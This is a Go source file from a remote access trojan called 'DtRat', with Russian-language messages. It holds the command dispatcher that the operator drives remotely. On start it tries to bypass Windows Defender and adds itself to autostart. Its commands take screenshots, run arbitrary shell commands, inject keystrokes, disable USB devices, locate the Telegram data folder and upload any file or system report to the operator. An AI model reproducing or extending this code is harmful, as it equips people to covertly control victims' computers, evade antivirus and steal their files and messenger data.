package rat

import (
	"dtrat/config"
	"dtrat/engine/system/usb"
	"dtrat/transport"
	"fmt"
	"os"
	"strconv"
	"strings"
)

func errToStatus(err error) string {
	if err == nil {
		return "Успешно"
	}

	return err.Error()
}

func (r *Rat) commandsSwitch(text string) {
	cmd, args := transport.ParseCommand(text)
	switch cmd {
	case "start":
		go r.startCmd()
	case "kill":
		go r.killCmd()
	case "help":
		go r.helpCmd()
	case "screenshot":
		go r.screenshotCmd()
	case "monitor":
		go r.monitorCmd(args)
	case "keyboard":
		go r.keyboardCmd(args)
	case "browser":
		go r.browserCmd(args)
	case "findtg":
		go r.findTgCmd()
	case "usb":
		go r.usbCmd(args)
	case "cmd":
		go r.cmdCmd(args)
	case "volume":
		go r.volumeCmd(args)
	case "sendfile":
		go r.sendFile(args)
	case "info":
		go r.infoCmd()
	default:
		go r.defaultCmd()
	}
}

func (r *Rat) startCmd() {
	r.Transport.Send("Вас приветствует DtRat %s!\nвыполните /help чтобы узнать как использовать DtRat.\n\nНачата первоначальная инициализация.", config.Version)

	suc, total := r.Hider.BypassDefender()
	err := r.Hider.AddToStartup()

	doneTxt :=
		`
Инициализация завершена!
Добавление в автозапуск: %s
Обход Windows Defender: %d из %d команд успешно выполнены.
`

	r.Transport.Send(doneTxt, errToStatus(err), suc, total)
}

func (r *Rat) defaultCmd() {
	r.Transport.Send("Неизвестная команда, используйте /help что-бы получить спискок доступных команд и справку по их использованию")
}

func (r *Rat) helpCmd() {
	r.Transport.Send("%s", helpText)
}

func (r *Rat) killCmd() {
	r.Transport.Send("Остоновка процессов...")
	r.internalClose(nil)
}

func (r *Rat) screenshotCmd() {
	screenshot, err := r.Engine.System.Screenshot()
	defer os.Remove(screenshot)

	if err != nil {
		r.Transport.Send("Ошика: %v", err)
		return
	}

	r.Transport.SendFile(screenshot)
}

func (r *Rat) monitorCmd(args string) {
	if args != "on" && args != "off" {
		r.Transport.Send("Используйте /monitor [on|off]")
		return
	}

	var err error = nil
	switch args {
	case "on":
		err = r.Engine.System.MonitorState(true)
	case "off":
		err = r.Engine.System.MonitorState(false)
	}

	if err != nil {
		r.Transport.Send("Ошибка: %v", err)
		return
	}

	switch args {
	case "on":
		r.Transport.Send("Монитор включен.")
		return
	case "off":
		r.Transport.Send("Монитор выключен.")
		return
	}
}

func (r *Rat) keyboardCmd(args string) {
	cmd, arg := transport.ParseCommand(args)

	var err error
	switch cmd {
	case "press":
		err = r.Engine.System.PressKey(arg)
	case "paste":
		err = r.Engine.System.Paste(arg)
	case "hotkey":
		err = r.Engine.System.PressHotKey(arg)
	default:
		r.Transport.Send("Неизвестное действие: %s", cmd)
		return
	}

	if err != nil {
		r.Transport.Send("Ошибка: %v", err)
		return
	}

	r.Transport.Send("Успешно выполнено!")
}

func (r *Rat) browserCmd(args string) {
	err := r.Engine.Media.OpenBrowser(args)
	if err != nil {
		r.Transport.Send("Ошибка: %v", err)
		return
	}

	r.Transport.Send("Браузер успешно открыт.")
}

func (r *Rat) findTgCmd() {
	r.Transport.Send("Поиск папки Telegram... Это может занять некоторое время.")

	path, err := r.Engine.Info.FindTelegramDir()
	if err != nil {
		r.Transport.Send("Ошибка: %v", err)
		return
	}

	r.Transport.Send("Папка Telegram найдена: %s", path)
}

func (r *Rat) usbDevicesListFmt(devices []usb.USBDevice) string {
	if len(devices) == 0 {
		return "USB устройства не найдены."
	}

	var bl strings.Builder

	bl.Grow(len(devices) * 150)

	for i, dev := range devices {
		status := "🟢 Активно"
		if !dev.IsActive {
			status = "🔴 Отключено"
		}

		fmt.Fprintf(&bl, "[%d] Имя: %s\n"+
			"    VID: %s | PID: %s\n"+
			"    ID: %s\n"+
			"    Статус: %s\n",
			i+1, dev.Name, dev.VendorID, dev.ProductID, dev.DeviceID, status)
	}

	return strings.TrimRight(bl.String(), "\n")
}

func (r *Rat) usbListCmd() {
	devices, err := r.Engine.System.GetUSBDevices()
	if err != nil {
		r.Transport.Send("Ошибка: %v", err)
		return
	}
	lst := r.usbDevicesListFmt(devices)

	r.Transport.Send("%s", lst)
}

func (r *Rat) usbEnableCmd(args string) {
	err := r.Engine.System.SetUSBDeviceState(args, true)
	if err != nil {
		r.Transport.Send("Ошибка: %v", err)
		return
	}

	r.Transport.Send("USB устройство %s включено.", args)
}

func (r *Rat) usbDisableCmd(args string) {
	err := r.Engine.System.SetUSBDeviceState(args, false)
	if err != nil {
		r.Transport.Send("Ошибка: %v", err)
		return
	}

	r.Transport.Send("USB устройство %s отключено.", args)
}

func (r *Rat) usbCmd(args string) {
	cmd, arg := transport.ParseCommand(args)

	switch cmd {
	case "list":
		go r.usbListCmd()
		return
	case "enable":
		go r.usbEnableCmd(arg)
		return
	case "disable":
		go r.usbDisableCmd(arg)
		return
	default:
		r.Transport.Send("Неизвестное действие: %s", cmd)
		return
	}
}

func (r *Rat) cmdCmd(args string) {
	out, err := r.Engine.System.Exec(args)
	if err != nil {
		r.Transport.Send("Ошибка: %v", err)
		return
	}

	r.Transport.Send("Результат:\n%s", out)
}

func (r *Rat) volumeCmd(args string) {
	volume, err := strconv.Atoi(args)
	if err != nil {
		r.Transport.Send("Ошибка: аргумент должен быть числом от 0 до 100.")
		return
	}

	err = r.Engine.System.SetVolume(volume)
	if err != nil {
		r.Transport.Send("Ошибка: %v", err)
		return
	}

	r.Transport.Send("Громкость успешно установлена на %d%%.", volume)
}

func (r *Rat) infoCmd() {
	info := r.Engine.Info.Report()
	err := r.Transport.Send("Информация о системе:\n%s", info)
	if err != nil {
		r.Transport.Send("Ошибка отправки: %v", err)
	}
}

func (r *Rat) sendFile(args string) {
	if args == "" {
		r.Transport.Send("Пожалуйста, укажите путь к файлу.")
		return
	}

	if _, err := os.Stat(args); os.IsNotExist(err) {
		r.Transport.Send("Файл не найден: %s", args)
		return
	}

	err := r.Transport.SendFile(args)
	if err != nil {
		r.Transport.Send("Ошибка отправки файла: %v", err)
		return
	}

	r.Transport.Send("Файл успешно отправлен: %s", args)
}
